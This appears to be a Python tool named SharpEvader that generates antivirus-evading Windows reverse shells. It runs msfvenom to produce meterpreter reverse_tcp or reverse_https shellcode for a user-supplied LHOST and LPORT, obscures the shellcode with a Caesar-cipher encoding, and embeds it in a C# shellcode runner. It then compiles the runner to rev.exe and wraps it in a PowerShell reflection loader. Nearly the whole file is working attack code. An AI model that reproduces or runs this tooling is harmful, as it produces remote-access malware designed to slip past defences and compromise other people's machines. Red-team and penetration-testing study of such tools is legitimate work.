import os
import subprocess

bold = "\033[1m"
green = "\033[32m"
white = "\033[37m"
purple = "\033[95m"
red = "\033[91m"
blue = "\033[34m"
orange = "\033[33m"
end = "\033[0m"

def print_success(text) :
    print(f"{bold}{green}[+] {end}{text}")
def print_info(text) :
    print(f"{bold}{purple}[*] {end}{text}")
def print_error(text) : 
    print(f"{bold}{red}[-] {end}{text}")
def banner():
	print(f"""{bold}{blue}
 ____  _                      _____                _           
/ ___|| |__   __ _ _ __ _ __ | ____|_   ____ _  __| | ___ _ __ 
{green}\___ \| '_ \ / _` | '__| '_ \|  _| \ \ / / _` |/ _` |/ _ \ '__|
{orange} ___) | | | | (_| | |  | |_) | |___ \ V / (_| | (_| |  __/ |   
{purple}|____/|_| |_|\__,_|_|  | .__/|_____| \_/ \__,_|\__,_|\___|_|   
{green}                       |_|                                     
	""")


banner()
LHOST = input(f"{orange}{bold}LHOST:{white} ")
LPORT = input(f"{orange}{bold}LPORT:{white} ")
PAYLOAD = input(f"{orange}{bold}PAYLOAD TYPE({green}{bold}tcp{orange}/{green}{bold}https{orange}):{white} ")
msfvenom = "windows/x64/meterpreter/reverse_"

if not os.path.isdir("output"):
	print_info(f"First Time use detected, Generating required Directories...")
	subprocess.run(["mkdir","output"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

if PAYLOAD.lower() not in ["tcp","https"]:
	print_error(f"{PAYLOAD} is an invalid payload type {red}{bold}dipshit{end}. Either use {bold}{green}https{end} or {bold}{green}tcp{end}")
	exit()

# If someone decides to enter the payload in capitals, or maybe when I type and my capslock is on accidentally
PAYLOAD = PAYLOAD.lower()

print_info(f"Using LHOST as {orange}{bold}{LHOST}{end}, LPORT as {bold}{orange}{LPORT}{end} and PAYLOAD as {bold}{orange}{msfvenom}{PAYLOAD}")

# Using msfvenom to generate shellcode for using windows/x64/meterpreter/reverse_https or reverse_tcp payload and LHOST and LPORT given as input from the user
print_info("Generating msfvenom shellcode...")
subprocess.run(["msfvenom","-p",f"windows/x64/meterpreter/reverse_{PAYLOAD}",f"LHOST={LHOST}",f"LPORT={LPORT}","-f","hex","-o","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
print_success("MSFVenom Shellcode generation successful")

# Reading the hexstring shellcode from the msfvenom file and converting into an integer array
with open("msf_shellcode.hex","r") as msf_hex_shellcode:
	hex_shellcode = msf_hex_shellcode.read()

integer_shellcode = [int(hex_shellcode[i:i+2],16) for i in range(0, len(hex_shellcode), 2)]


# Caeser Cipher Section which also has the caeser cipher key
scrambled_shellcode = []
caeser_key = 7
for each in integer_shellcode:
	scrambled_shellcode.append(hex((each + caeser_key) & 0xff))

print_success(f"Encoded shellcode with caeser cipher with +{caeser_key} as Key")

# Packing the shellcode in the 0xff style array for usage in C#
final_shellcode = ""
for i in range(len(scrambled_shellcode)):
	if i == 0:
		final_shellcode += f"byte[] buf = new byte[{len(scrambled_shellcode)}]" + "{\n"
	final_shellcode += scrambled_shellcode[i]
	if i % 14 == 0 and i != 0:
		final_shellcode += ",\n"
	elif i == 0 or (i % 14 != 0 and i != len(scrambled_shellcode)-1):
		final_shellcode += ","
	if i == len(scrambled_shellcode)-1:
		final_shellcode += " };"

# Removing the shellcode as no one needs it anymore
subprocess.run(["rm","-rf","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
print_info(f"Deleting the msf_shellcode.hex file as no one wants it anymore")


# Assembling a c# sln project with encoded shellcode in the output directory
print_info(f"Baking the fresh Shellcode into a C# project for compiling")
csharp_proj_name = f"{LHOST}_{LPORT}_{PAYLOAD}"

if os.path.isdir(f"output/{csharp_proj_name}"):
	print_info("Existing generated shellcode found, Overwriting it :P")
	subprocess.run(["rm","-rf",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

subprocess.run(["mkdir","-p",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
subprocess.run(["cp","-r","templates/rev_exe",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

with open(f"output/{csharp_proj_name}/csharp/Program.cs","r") as csharp_template_code:
	template_code = csharp_template_code.readlines()

template_code.insert(30,final_shellcode)

with open(f"output/{csharp_proj_name}/csharp/Program.cs","w") as final_csharp_code:
	template_code = "".join(template_code)
	final_csharp_code.write(template_code)
print_success(f"Your C# shellcode runner is baked successfully, and it smells nice !!!")

# Checking the availability of mono-mcs and Powershell on Linux
try:
	mcs_availability = subprocess.run(["mcs","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
except FileNotFoundError:
	mcs_availability = 1
try:
	pwsh_availability = subprocess.run(["pwsh","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
except FileNotFoundError:
	pwsh_availability = 1

if mcs_availability == 0:
	print_success("C# Compiler found, Time for some frosting on the cake ^_^")
	# Starting the compilation of the payload using mono-mcs
	subprocess.run(["mcs",f"-out:output/{csharp_proj_name}/rev.exe",f"output/{csharp_proj_name}/csharp/Program.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	print_success(f"Your cake has been frosted successfully and named output/{csharp_proj_name}/rev.exe")
else:
	print_error(f"Err!!! Could not compile the C# payload, possibly mcs is missing :(")
if pwsh_availability == 0 and mcs_availability == 0:
	print_success("Powershell Found, Let's Box up your frosted cake...")
	subprocess.run(["pwsh","reflection_pwsh_gen.ps1","-File",f"output/{csharp_proj_name}/rev.exe"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	subprocess.run(["mv","rev.ps1",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	print_success(f"Boxed it up and named output/{csharp_proj_name}/rev.ps1")
elif pwsh_availability == 0 and mcs_availability != 0:
	print_error("Reflection cannot be generated if the code is not yet compiled !!!")
	print_info("Please compile the code into an executable and then, attempt to generate an reflection with the ps1 script :)")


print_success(f"{orange}{bold}Happy Evasion using {csharp_proj_name}!!!{end}")